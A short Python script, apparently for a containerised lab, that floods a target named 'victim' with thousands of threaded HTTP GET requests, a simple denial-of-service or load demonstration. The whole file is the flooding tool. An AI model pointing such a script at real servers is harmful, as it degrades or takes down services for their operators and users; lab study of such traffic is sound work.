import threading, time, requests, argparse

def worker(id, target, n, delay):
    for i in range(n):
        try:
            r = requests.get(target, timeout=5)
            print(f"[T{id}] {i+1}/{n} -> {r.status_code} ({len(r.content)} bytes)")
        except Exception as e:
            print(f"[T{id}] error: {e}")
        time.sleep(delay)

# def debug(id, target, n, delay):
#     print("Hello")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://victim:80/", help="Ziel (Container-Hostname)")
    parser.add_argument("--threads", type=int, default=20)
    parser.add_argument("--reqs", type=int, default=200, help="Requests pro Thread")
    parser.add_argument("--delay", type=float, default=0.01, help="Pause zwischen Requests (s)")
    args = parser.parse_args()

    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=worker, args=(i, args.target, args.reqs, args.delay))
        t.start()
        time.sleep(0.1)
        threads.append(t)
    for t in threads:
        t.join()
    print("Done.")

if __name__ == "__main__":
    main()